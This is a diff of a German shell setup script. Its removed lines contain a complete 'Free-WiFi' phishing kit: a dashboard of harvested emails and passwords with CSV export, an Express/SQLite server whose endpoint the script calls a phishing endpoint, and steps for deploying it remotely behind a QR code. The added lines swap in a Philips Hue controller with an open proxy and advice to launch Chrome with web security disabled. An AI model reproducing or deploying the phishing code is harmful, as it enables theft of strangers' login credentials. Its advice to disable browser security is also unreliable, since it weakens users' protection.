-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard - Gesammelte Credentials</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Roboto', Arial, sans-serif;
-        }
-
-        body {
-            background-color: #f1f1f1;
-            color: #333;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-        }
-
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding-bottom: 20px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #eee;
-        }
-
-        h1 {
-            color: #2C2E3B;
-            font-size: 24px;
-        }
-
-        .toolbar {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        button {
-            background-color: #2C2E3B;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-
-        button:hover {
-            background-color: #1e2030;
-        }
-
-        .export-btn {
-            background-color: #34A853;
-        }
-
-        .export-btn:hover {
-            background-color: #2d9249;
-        }
-
-        .delete-btn {
-            background-color: #EA4335;
-        }
-
-        .delete-btn:hover {
-            background-color: #d33426;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
-        th, td {
-            padding: 12px 15px;
-            text-align: left;
-            border-bottom: 1px solid #eee;
-        }
-
-        th {
-            background-color: #f9f9f9;
-            font-weight: 500;
-            font-size: 14px;
-            color: #5f6368;
-        }
-
-        tr:hover {
-            background-color: #f7f9fc;
-        }
-
-        .badge {
-            display: inline-block;
-            padding: 4px 8px;
-            border-radius: 12px;
-            font-size: 12px;
-            font-weight: 500;
-        }
-
-        .badge-google {
-            background-color: #f1f3f4;
-            color: #4285F4;
-        }
-
-        .badge-email {
-            background-color: #e8f0fe;
-            color: #1a73e8;
-        }
-
-        .status {
-            margin: 15px 0;
-            font-size: 14px;
-            color: #5f6368;
-        }
-
-        .no-records {
-            padding: 40px;
-            text-align: center;
-            color: #5f6368;
-            font-style: italic;
-        }
-
-        .timestamp {
-            font-size: 12px;
-            color: #70757a;
-        }
-
-        footer {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: #5f6368;
-            padding-top: 10px;
-            border-top: 1px solid #eee;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <header>
-            <h1>Admin Dashboard - Gesammelte Credentials</h1>
-            <p id="total-count" class="status">Lade Daten...</p>
-        </header>
-
-        <div class="toolbar">
-            <button id="refresh-btn">Aktualisieren</button>
-            <button id="export-btn" class="export-btn">Exportieren (CSV)</button>
-            <button id="delete-all-btn" class="delete-btn">Alle löschen</button>
-        </div>
-
-        <div id="records-container">
-            <table id="credentials-table">
-                <thead>
-                    <tr>
-                        <th>ID</th>
-                        <th>Typ</th>
-                        <th>E-Mail</th>
-                        <th>Passwort</th>
-                        <th>IP-Adresse</th>
-                        <th>User-Agent</th>
-                        <th>Zeitstempel</th>
-                    </tr>
-                </thead>
-                <tbody id="table-body">
-                    <!-- Tabellendaten werden hier eingefügt -->
-                </tbody>
-            </table>
-            <div id="no-records" class="no-records" style="display: none;">
-                Keine Datensätze gefunden.
-            </div>
-        </div>
-
-        <footer>
-            <p>Sicherheitsforschung - Nur zu Bildungszwecken und autorisierten Tests</p>
-        </footer>
-    </div>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const tableBody = document.getElementById('table-body');
-            const totalCount = document.getElementById('total-count');
-            const noRecords = document.getElementById('no-records');
-            const refreshBtn = document.getElementById('refresh-btn');
-            const exportBtn = document.getElementById('export-btn');
-            const deleteAllBtn = document.getElementById('delete-all-btn');
-
-            // Daten laden
-            function loadCredentials() {
-                fetch('/api/admin/credentials')
-                    .then(response => response.json())
-                    .then(data => {
-                        tableBody.innerHTML = '';
-
-                        if (data.length === 0) {
-                            noRecords.style.display = 'block';
-                            document.getElementById('credentials-table').style.display = 'none';
-                            totalCount.textContent = 'Keine Datensätze vorhanden';
-                        } else {
-                            noRecords.style.display = 'none';
-                            document.getElementById('credentials-table').style.display = 'table';
-                            totalCount.textContent = `${data.length} Datensätze gefunden`;
-
-                            data.forEach(record => {
-                                const row = document.createElement('tr');
-
-                                const typeClass = record.type === 'google' ? 'badge-google' : 'badge-email';
-                                const typeText = record.type === 'google' ? 'Google' : 'E-Mail';
-
-                                row.innerHTML = `
-                                    <td>${record.id}</td>
-                                    <td><span class="badge ${typeClass}">${typeText}</span></td>
-                                    <td>${escapeHtml(record.email)}</td>
-                                    <td>${escapeHtml(record.password)}</td>
-                                    <td>${escapeHtml(record.ipAddress || '-')}</td>
-                                    <td title="${escapeHtml(record.userAgent || '')}">${escapeHtml(record.userAgent ? record.userAgent.substring(0, 30) + '...' : '-')}</td>
-                                    <td class="timestamp">${new Date(record.timestamp).toLocaleString()}</td>
-                                `;
-
-                                tableBody.appendChild(row);
-                            });
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        totalCount.textContent = 'Fehler beim Laden der Daten';
-                    });
-            }
-
-            // Sicherheitsmaßnahme: HTML-Escaping
-            function escapeHtml(text) {
-                if (!text) return '';
-                const div = document.createElement('div');
-                div.textContent = text;
-                return div.innerHTML;
-            }
-
-            // CSV-Export
-            function exportToCsv() {
-                fetch('/api/admin/credentials')
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.length === 0) {
-                            alert('Keine Daten zum Exportieren vorhanden.');
-                            return;
-                        }
-
-                        // CSV-Header
-                        let csvContent = 'ID,Typ,E-Mail,Passwort,IP-Adresse,User-Agent,Zeitstempel\n';
-
-                        // CSV-Daten
-                        data.forEach(record => {
-                            const row = [
-                                record.id,
-                                record.type,
-                                record.email,
-                                record.password,
-                                record.ipAddress || '',
-                                record.userAgent || '',
-                                record.timestamp
-                            ].map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',');
-
-                            csvContent += row + '\n';
-                        });
-
-                        // Download-Link erstellen
-                        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
-                        const url = URL.createObjectURL(blob);
-                        const link = document.createElement('a');
-                        link.setAttribute('href', url);
-                        link.setAttribute('download', `credentials_${new Date().toISOString().slice(0, 10)}.csv`);
-                        link.style.visibility = 'hidden';
-                        document.body.appendChild(link);
-                        link.click();
-                        document.body.removeChild(link);
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        alert('Fehler beim Exportieren der Daten');
-                    });
-            }
-
-            // Alle Datensätze löschen (erfordert entsprechenden Server-Endpunkt)
-            function deleteAllRecords() {
-                if (confirm('Bist du sicher, dass du alle Datensätze löschen möchtest? Diese Aktion kann nicht rückgängig gemacht werden.')) {
-                    alert('Hinweis: Diese Funktion muss auf dem Server implementiert werden. Für diese Demo wird nur die Tabelle geleert.');
-                    tableBody.innerHTML = '';
-                    noRecords.style.display = 'block';
-                    document.getElementById('credentials-table').style.display = 'none';
-                    totalCount.textContent = 'Keine Datensätze vorhanden';
-                }
-            }
-
-            // Event-Handler
-            refreshBtn.addEventListener('click', loadCredentials);
-            exportBtn.addEventListener('click', exportToCsv);
-            deleteAllBtn.addEventListener('click', deleteAllRecords);
-
-            // Initial Daten laden
-            loadCredentials();
-        });
-    </script>
-</body>
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#2C2E3B" />
+    <meta
+      name="description"
+      content="Philips Hue Controller - Browser-App zur Steuerung von Philips Hue-Lampen"
+    />
+    <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />
+    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
+    <title>Philips Hue Controller</title>
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+  </body>
 </html>
-EOL
+EOF
 
-# Installiere Abhängigkeiten
-echo "📦 Installiere Abhängigkeiten..."
-npm install
-npm install --save-dev qrcode
-npm install express body-parser cors sqlite3
-
-# Erstelle server.js
-echo "📄 Erstelle server.js für Credential-Speicherung..."
-cat > server.js << 'EOL'
-// server.js - Backend-Server zum Empfangen und Speichern von Credentials
+# Erstelle CORS Proxy Script
+echo -e "\n${GREEN}10. Erstelle CORS Proxy Script${NC}"
+cat > cors-proxy.js << 'EOF'
+// cors-proxy.js
 const express = require('express');
-const bodyParser = require('body-parser');
 const cors = require('cors');
-const sqlite3 = require('sqlite3').verbose();
-const path = require('path');
-const fs = require('fs');
+const { createProxyMiddleware } = require('http-proxy-middleware');
 
-// Server-Konfiguration
 const app = express();
-const PORT = 6666;
 
-// Middleware
+// CORS für alle Anfragen aktivieren
 app.use(cors());
-app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, 'build')));
 
-// Datenbank-Einrichtung
-const dbDir = path.join(__dirname, 'data');
-if (!fs.existsSync(dbDir)) {
-  fs.mkdirSync(dbDir);
-}
-
-const db = new sqlite3.Database(path.join(dbDir, 'credentials.db'));
-
-// Datenbank-Tabelle erstellen
-db.serialize(() => {
-  db.run(`
-    CREATE TABLE IF NOT EXISTS credentials (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      type TEXT NOT NULL,
-      email TEXT NOT NULL,
-      password TEXT NOT NULL,
-      ipAddress TEXT,
-      userAgent TEXT,
-      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-    )
-  `);
-});
-
-// Endpoint zum Empfangen von Credentials
-app.post('/api/log', (req, res) => {
-  const { type, email, password } = req.body;
-  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  const userAgent = req.headers['user-agent'];
-
-  if (!type || !email || !password) {
-    return res.status(400).json({ error: 'Unvollständige Daten' });
+// Proxy-Middleware-Konfiguration
+const apiProxy = createProxyMiddleware({
+  target: 'http://localhost:8080', // Wird dynamisch überschrieben
+  changeOrigin: true,
+  router: function(req) {
+    // Extrahiere die Ziel-IP aus dem Pfad
+    const pathParts = req.url.split('/');
+    if (pathParts.length > 2 && pathParts[1] === 'hue') {
+      const targetIp = pathParts[2];
+      const newPath = '/' + pathParts.slice(3).join('/');
+      req.url = newPath;
+      return `http://${targetIp}`;
+    }
+    return 'http://localhost';
+  },
+  pathRewrite: function(path, req) {
+    const pathParts = path.split('/');
+    if (pathParts.length > 2 && pathParts[1] === 'hue') {
+      return '/' + pathParts.slice(3).join('/');
+    }
+    return path;
   }
-
-  const stmt = db.prepare(`
-    INSERT INTO credentials (type, email, password, ipAddress, userAgent)
-    VALUES (?, ?, ?, ?, ?)
-  `);
-
-  stmt.run(type, email, password, ipAddress, userAgent, (err) => {
-    if (err) {
-      console.error('Fehler beim Speichern der Credentials:', err);
-      return res.status(500).json({ error: 'Datenbankfehler' });
-    }
-
-    console.log(`Neue ${type} Credentials gespeichert: ${email}`);
-    res.status(200).json({ status: 'success' });
-  });
-
-  stmt.finalize();
 });
 
-// Endpoint zum Anzeigen aller gesammelten Credentials (nur für Administratoren)
-app.get('/api/admin/credentials', (req, res) => {
-  // Hier könnte eine Admin-Authentifizierung stattfinden
+// Alle Anfragen an /hue/{bridgeIP} werden zum Proxy weitergeleitet
+app.use('/hue', apiProxy);
 
-  db.all('SELECT * FROM credentials ORDER BY timestamp DESC', (err, rows) => {
-    if (err) {
-      console.error('Fehler beim Abrufen der Credentials:', err);
-      return res.status(500).json({ error: 'Datenbankfehler' });
-    }
-
-    res.status(200).json(rows);
-  });
-});
-
-// Serviere React-App für alle anderen Routen
-app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'build', 'index.html'));
+// Standard-Route
+app.get('/', (req, res) => {
+  res.send('Philips Hue CORS Proxy läuft. Verwende /hue/{bridge-ip}/api/... für Anfragen.');
 });
 
 // Server starten
+const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
-  console.log(`Server läuft auf Port ${PORT}`);
-  console.log(`Phishing-Endpunkt: http://localhost:${PORT}/api/log`);
-  console.log(`Admin-Übersicht: http://localhost:${PORT}/api/admin/credentials`);
+  console.log(`CORS Proxy läuft auf Port ${PORT}`);
+  console.log(`Für Hue Bridge API-Anfragen verwende: http://localhost:${PORT}/hue/{bridge-ip}/api/...`);
 });
-EOL
+EOF
 
-# Kompiliere die App
-echo "🔨 Baue die React-App..."
+# Aktualisiere package.json für CORS Proxy
+echo -e "\n${GREEN}11. Aktualisiere package.json mit CORS Proxy Abhängigkeiten${NC}"
+cat > cors-proxy-package.json << 'EOF'
+{
+  "name": "hue-cors-proxy",
+  "version": "1.0.0",
+  "description": "CORS Proxy für Philips Hue Bridge API",
+  "main": "cors-proxy.js",
+  "scripts": {
+    "start": "node cors-proxy.js"
+  },
+  "dependencies": {
+    "cors": "^2.8.5",
+    "express": "^4.18.2",
+    "http-proxy-middleware": "^2.0.6"
+  }
+}
+EOF
+
+# Erstelle README.md
+echo -e "\n${GREEN}12. Erstelle README.md${NC}"
+cat > README.md << 'EOF'
+# Philips Hue Controller
+
+Eine React-App zur Steuerung von Philips Hue-Lampen über die offizielle API.
+
+## Features
+
+- Automatische Bridge-Suche im lokalen Netzwerk
+- Benutzer-Erstellung für API-Zugriff
+- Ein-/Ausschalten, Helligkeit und Farbsteuerung für alle Lampen
+- Speicherung der Verbindungsdaten
+
+## Projektstruktur
+
+```
+philips-hue-controller/
+├── public/           # Statische Dateien
+├── src/              # Quellcode
+│   ├── components/   # React-Komponenten
+│   ├── App.css       # Styling
+│   ├── App.jsx       # Hauptkomponente
+│   └── index.js      # Einstiegspunkt
+├── cors-proxy.js     # CORS Proxy Server
+├── cors-proxy-package.json # Abhängigkeiten für CORS Proxy
+└── package.json      # Projektabhängigkeiten
+```
+
+## Installation
+
+```bash
+# React-App Abhängigkeiten installieren
+npm install
+
+# Entwicklungsserver starten
+npm start
+```
+
+## CORS-Behandlung
+
+Da die Philips Hue Bridge keine CORS-Header sendet, gibt es folgende Optionen:
+
+### Option 1: Enthaltenen CORS Proxy verwenden
+
+```bash
+# In einem separaten Terminal:
+mkdir -p cors-proxy && cd cors-proxy
+cp ../cors-proxy-package.json package.json
+cp ../cors-proxy.js cors-proxy.js
+npm install
+npm start
+```
+
+Dann musst du die API-URLs in der App anpassen:
+- Ändere `http://${bridgeIP}/api` zu `http://localhost:8080/hue/${bridgeIP}/api`
+
+### Option 2: Browser mit deaktivierten Sicherheitseinstellungen starten
+
+Für Chrome unter macOS:
+```
+open -n -a /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --args --user-data-dir="/tmp/chrome_dev_test" --disable-web-security
+```
+
+Für Chrome unter Linux:
+```
+google-chrome --disable-web-security --user-data-dir="/tmp/chrome_dev_session"
+```
+
+## Verwendung
+
+1. Starte die App im Browser
+2. Klicke auf "Bridge finden" oder gib die IP-Adresse deiner Hue Bridge manuell ein
+3. Drücke den physischen Link-Button auf deiner Hue Bridge
+4. Klicke auf "Neuen Benutzer erstellen" in der App
+5. Verbinde dich mit der Bridge
+
+Die Verbindungsdaten werden im lokalen Speicher des Browsers gespeichert, sodass du dich nicht jedes Mal neu verbinden musst.
+
+## Produktion
+
+```bash
+# Build für Produktionsumgebung erstellen
 npm run build
+```
 
-# Erstelle den QR-Code für den Server
-echo "🔄 Erstelle QR-Code für Server auf Port 6666..."
-node generate-qr.js http://localhost:6666
+Die optimierten Dateien werden im `build/`-Verzeichnis erstellt und können auf einem Webserver gehostet werden.
+EOF
 
-echo ""
-echo "✅ Free-WiFi Phishing-Testumgebung mit Datenbank-Backend wurde erfolgreich erstellt!"
-echo ""
-echo "Anleitung zum Starten der App mit Datenbank-Backend:"
-echo "1. Navigiere in den Ordner 'free-wifi'"
-echo "2. Führe 'npm run server' aus, um den Server auf Port 6666 zu starten"
-echo "3. Die App ist dann unter http://localhost:6666 verfügbar"
-echo "4. Credentials werden in der SQLite-Datenbank 'data/credentials.db' gespeichert"
-echo "5. Admin-Übersicht der gesammelten Daten: http://localhost:6666/api/admin/credentials"
-echo ""
-echo "Für die Bereitstellung auf einem Remote-Server:"
-echo "1. Führe 'npm run build' aus, um eine optimierte Version zu erstellen"
-echo "2. Kopiere die server.js, package.json und den gesamten build-Ordner auf deinen Server"
-echo "3. Führe 'npm install' und dann 'npm run server' auf dem Server aus"
-echo ""
-echo "Für eine produktionsreife Einrichtung:"
-echo "1. Passe die IP- und Port-Einstellungen in server.js an"
-echo "2. Erstelle einen neuen QR-Code mit deiner tatsächlichen Server-URL:"
-echo "   node generate-qr.js https://deine-server-url.com:6666"
-echo ""
-echo "QR-Code wurde erstellt und im Projektordner gespeichert (wifi-qr.png)"
-echo ""
-echo "⚠️ WICHTIG: Diese Anwendung darf nur für autorisierte Sicherheitstests verwendet werden! ⚠️"
+# Erstelle Startscript
+echo -e "\n${GREEN}13. Erstelle Startscript${NC}"
+cat > start-hue-controller.sh << 'EOF'
+#!/bin/bash
 
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No Color
+
+echo -e "${GREEN}Philips Hue Controller - Starter${NC}"
+echo -e "==============================="
+
+# Verzeichnis für die App
+APP_DIR="philips-hue-controller"
+PROXY_DIR="cors-proxy"
+
+# Prüfe, ob die App existiert
+if [ ! -d "$APP_DIR" ]; then
+    echo -e "${YELLOW}Hue Controller App nicht gefunden. Bitte führe zuerst das Installationsskript aus.${NC}"
+    exit 1
+fi
+
+# CORS Proxy einrichten, falls er nicht existiert
+if [ ! -d "$PROXY_DIR" ]; then
+    echo -e "${GREEN}Richte CORS Proxy ein...${NC}"
+    mkdir -p "$PROXY_DIR"
+    cp "$APP_DIR/cors-proxy-package.json" "$PROXY_DIR/package.json"
+    cp "$APP_DIR/cors-proxy.js" "$PROXY_DIR/cors-proxy.js"
+
+    # Ins Proxy-Verzeichnis wechseln und Abhängigkeiten installieren
+    cd "$PROXY_DIR" || exit
+    npm install
+
+    # Zurück ins Hauptverzeichnis
+    cd ..
+fi
+
+# Starte CORS Proxy im Hintergrund
+echo -e "${GREEN}Starte CORS Proxy...${NC}"
+cd "$PROXY_DIR" || exit
+node cors-proxy.js &
+PROXY_PID=$!
 cd ..
 
-chmod +x free-wifi/setup-free-wifi.sh
+# Warte ein wenig, damit der Proxy Zeit zum Starten hat
+sleep 2
 
-echo "Das Skript kann jetzt mit './free-wifi/setup-free-wifi.sh' ausgeführt werden."
+# Starte die React-App
+echo -e "${GREEN}Starte Hue Controller App...${NC}"
+cd "$APP_DIR" || exit
+npm start
+
+# Wenn die React-App beendet wird, beende auch den Proxy
+kill $PROXY_PID
+
+echo -e "${GREEN}Anwendung beendet.${NC}"
+EOF
+
+# Zugriffsrechte für Startscript setzen
+chmod +x start-hue-controller.sh
+
+# Installiere Abhängigkeiten
+echo -e "\n${GREEN}14. Installiere Abhängigkeiten${NC}"
+echo -e "Dies kann einige Minuten dauern..."
+npm install
+
+echo -e "\n${GREEN}Installation abgeschlossen!${NC}"
+echo -e "Der Philips Hue Controller wurde erfolgreich erstellt."
+echo -e "\nUm die App zu starten, führe das Startskript aus:"
+echo -e "${YELLOW}./start-hue-controller.sh${NC}"
+echo -e "\nODER starte die App manuell:"
+echo -e "${YELLOW}cd $PROJECT_NAME${NC}"
+echo -e "${YELLOW}npm start${NC}"
+echo -e "\nHinweis: Aufgrund von CORS-Einschränkungen musst du entweder den CORS Proxy verwenden"
+echo -e "oder einen Browser mit deaktivierten Sicherheitseinstellungen starten."
+echo -e "Siehe README.md für weitere Informationen."
+
+# Mache das Skript ausführbar
+chmod +x install-hue-controller.sh
